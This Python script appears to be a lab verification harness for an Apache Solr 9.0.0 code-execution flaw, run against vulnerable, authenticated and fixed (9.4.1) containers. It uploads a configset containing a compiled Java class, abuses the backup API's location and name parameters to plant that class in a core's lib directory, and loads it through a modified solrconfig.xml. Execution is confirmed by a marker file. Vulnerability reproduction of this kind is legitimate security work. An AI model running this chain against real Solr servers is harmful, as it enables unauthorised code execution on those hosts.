import io
import json
import os
from pathlib import Path
import sys
import zipfile
import shutil
import hashlib

sys.dont_write_bytecode = True
sys.path.insert(0, str(Path(__file__).resolve().parent.parent / 'solr_velocity'))
from native_client import NativeSolr

runtime = json.loads(Path(os.environ['MODULE_TARGET_RUNTIME']).read_text())
client = NativeSolr(runtime)
artifacts = Path(runtime['artifacts'])
admin = ('solr', 'module-target-solr-password')
compiled = b''


def credentials(service):
    return admin if service == 'secured' else None


def archive(config, with_class=False, trigger=False):
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, 'w') as zipped:
        for path in config.rglob('*'):
            if not path.is_file():
                continue
            data = path.read_bytes()
            if trigger and path.name == 'solrconfig.xml':
                data = data.replace(b'</config>', b'<valueSourceParser name="native" class="zk_backup_0.configs.moduleconfig.SourceParser"/></config>')
            zipped.writestr(path.relative_to(config).as_posix(), data)
        if with_class:
            zipped.writestr('SourceParser.class', compiled)
    return buffer.getvalue()


def api(service, endpoint, **query):
    query['wt'] = 'json'
    return client.request(service, '/solr/admin/' + endpoint, query=query, auth=credentials(service))


def upload(service, name, data):
    return client.request(service, '/solr/admin/configs', method='POST', query={'action': 'UPLOAD', 'name': name}, data=data, content_type='application/octet-stream', auth=credentials(service))


def state(service):
    status, collections, body = api(service, 'collections', action='LIST')
    assert status == 200, body
    status, configs, body = api(service, 'configs', action='LIST')
    assert status == 200, body
    directories = client.command(service, 'find', '/var/solr/data', '-mindepth', '1', '-maxdepth', '1', '-type', 'd', '-printf', '%f\n')['stdout'].splitlines()
    return dict(collections=sorted(collections['collections']), configs=sorted(configs['configSets']), directories=sorted(directories))


proof = {}
try:
    shutil.copy2(Path(__file__).with_name('SourceParser.java'), artifacts / 'SourceParser.java')
    client.command('compiler', 'javac', '--release', '17', '-d', '/work/compiled', '/work/SourceParser.java')
    client.command('compiler', 'javac', '-version')
    compiled = (artifacts / 'compiled/zk_backup_0/configs/moduleconfig/SourceParser.class').read_bytes()
    assert compiled[:8] == bytes.fromhex('cafebabe0000003d')
    class_sha256 = hashlib.sha256(compiled).hexdigest()
    client.command('secured', 'solr', 'auth', 'enable', '-credentials', ':'.join(admin), '-blockUnknown', 'true', '-z', 'localhost:9983', '-s', '/var/solr/data')
    for service, version in [('vulnerable', '9.0.0'), ('secured', '9.0.0'), ('fixed', '9.4.1')]:
        cli = client.command(service, 'solr', 'version')
        java = client.command(service, 'java', '-version')
        identity = client.command(service, 'id')
        assert version in cli['stdout']
        status, info, _ = client.request(service, '/solr/admin/info/system', query={'wt': 'json'}, auth=credentials(service))
        assert status == 200 and info['lucene']['solr-spec-version'] == version
        config = artifacts / ('native-config-' + service)
        assert not config.exists()
        client.compose('cp', service + ':/opt/solr/server/solr/configsets/_default/conf', str(config))
        before = state(service)
        marker = '/tmp/module-target-solr-native-backup'
        client.command(service, 'test', '!', '-e', marker)
        status, document, body = upload(service, 'moduleconfig', archive(config, with_class=True))
        assert status == 200, (status, body)
        listing = client.command(service, 'solr', 'zk', 'ls', '/configs/moduleconfig', '-r', '-z', 'localhost:9983')
        assert ('SourceParser.class' in listing['stdout']) == (service != 'fixed')
        status, _, body = api(service, 'collections', action='CREATE', name='native_source', numShards=1, replicationFactor=1, **{'collection.configName': 'moduleconfig'})
        assert status == 200, body
        status, query, body = client.request(service, '/solr/native_source/select', query={'q': '*:*', 'wt': 'json'}, auth=credentials(service))
        assert status == 200 and query['response']['numFound'] == 0, body
        status, _, body = api(service, 'collections', action='BACKUP', collection='native_source', location='/var/solr/data', name='native_trigger_shard1_replica_n1')
        assert status == 200, body
        status, _, body = api(service, 'collections', action='BACKUP', collection='native_source', location='/var/solr/data/native_trigger_shard1_replica_n1', name='lib')
        assert status == 200, body
        exported = client.command(service, 'find', '/var/solr/data/native_trigger_shard1_replica_n1', '-type', 'f', '-name', 'SourceParser.class', '-exec', 'sha256sum', '{}', ';')
        if service == 'fixed':
            assert not exported['stdout'].strip()
        else:
            assert len(exported['stdout'].splitlines()) == 2 and all(line.split()[0] == class_sha256 for line in exported['stdout'].splitlines()), exported
        status, _, body = upload(service, 'moduletrigger', archive(config, trigger=True))
        assert status == 200, body
        status, document, body = api(service, 'collections', action='CREATE', name='native_trigger', numShards=1, replicationFactor=1, **{'collection.configName': 'moduletrigger'})
        stat = client.command(service, 'stat', '-c', '%U|%s', marker, check=False)
        if service == 'fixed':
            assert stat['exitstatus'] != 0, stat
        else:
            assert stat['exitstatus'] == 0 and stat['stdout'].strip() == 'solr|0', (status, body, stat)
        proof[service] = dict(version=version, lucene=info['lucene']['lucene-spec-version'], system=info['system'], java=java, identity=identity, actual_execution=stat['exitstatus'] == 0, create_status=status, create_response=document, exported_class_hashes=exported['stdout'], class_sha256=class_sha256)
        for name in ('native_source', 'native_trigger'):
            api(service, 'collections', action='DELETE', name=name)
        for name in ('moduleconfig', 'moduletrigger'):
            status, _, body = api(service, 'configs', action='DELETE', name=name)
            assert status == 200, body
        client.command(service, 'rm', '-rf', '--', '/var/solr/data/native_trigger_shard1_replica_n1', '/var/solr/data/native_source_shard1_replica_n1', marker)
        assert state(service) == before
    for auth, expected in [(None, 401), (('solr', 'wrong-password'), 401), (admin, 200)]:
        status, _, body = client.request('secured', '/solr/admin/info/system', auth=auth)
        assert status == expected, body
    for endpoint, command in [('authentication', {'set-user': {'viewer': 'module-target-viewer-password'}}), ('authorization', {'set-user-role': {'viewer': 'viewer'}, 'set-permission': {'name': 'all', 'role': 'admin'}})]:
        status, _, body = client.request('secured', '/solr/admin/' + endpoint, method='POST', auth=admin, data=command)
        assert status == 200, body
    status, _, body = client.request('secured', '/solr/admin/info/system', auth=('viewer', 'module-target-viewer-password'))
    assert status == 403, body
    status, _, body = client.request('secured', '/solr/admin/info/system', auth=admin)
    assert status == 200, body
    for service in proof:
        status, _, body = client.request(service, '/solr/')
        assert status == 200 and b'solrAdminApp' in body, body
    status, _, body = client.request('unrelated', '/')
    assert status == 200 and b'It works!' in body and b'solrAdminApp' not in body
    status, _, _ = client.request('vulnerable', '/module-target-no-solr/admin/info/system')
    assert status == 404
finally:
    client.write(artifacts / 'native-backup.json', profiles=proof)
print(json.dumps(dict(profiles=proof, commands=client.commands, requests=client.requests)))
